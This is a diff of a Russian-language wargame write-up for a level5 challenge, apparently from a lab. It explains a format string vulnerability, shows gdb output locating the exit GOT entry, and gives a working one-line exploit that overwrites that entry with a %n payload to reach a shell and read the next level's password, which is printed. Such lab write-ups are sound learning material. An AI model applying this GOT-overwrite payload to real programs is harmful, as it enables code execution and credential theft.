@@ -5,12 +5,23 @@
 
 Нам нужно заставить программу исполнить функцию `o` , ведь именно она запускает программную оболочку. Мы замечаем, что имеющийся вызов к `printf` с непроверенным пользовательским кодом делает программу уязвимой к атакам [uncontrolled format string](https://en.wikipedia.org/wiki/Uncontrolled_format_string). 
 
-Нам остается перезаписать сохраненный на стеке `eip`  регистр так, чтобы по завершении функции  `n`  управления не возвращалось  к `main`, а переходило к функции  `o`.
+Нам нужно перезаписать [global offset table](https://en.wikipedia.org/wiki/Global_Offset_Table) (GOT), для того, чтобы по окончанию функции `n` оказывалась вызвана функция `o` вместо `exit`.
+
+```sh
+$ gdb level5
+(gdb) disas n
+...
+0x080484ff <+61>:	call   0x80483d0 <exit@plt>
+(gdb) x/i 0x80483d0
+0x80483d0 <exit@plt>:	jmp    *0x8049838
+```
+
+Значит, нам нужно записать адрес функции `o` в ячейку памяти `0x8049838`.
 
 Функция `o` находится по адресу `0x080484a4`, что соответствует числу `134513828` в десятичной системе. Как и в level3, буфер, содержащий форматную строку, находятся на расстоянии в `0x218-0x208=0x10` байтов от вершины стека. 
 
 Итого,
 ```sh
-$ (python -c 'print "\x38\x98\x04\x08" + "%134513824x" + "%4$n"'; echo 'echo start; cd ..; cat level6/.pass') | ./level5 > /tmp/level5_out ; cat /tmp/level5_out | grep -A10 -i start
+$ (python -c 'print "\x38\x98\x04\x08" + "%134513824x" + "%4$n"'; echo 'echo; echo start; cd ..; cat level6/.pass') | ./level5 > /tmp/level5_out ; cat /tmp/level5_out | grep -A10 -i start
 d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ```
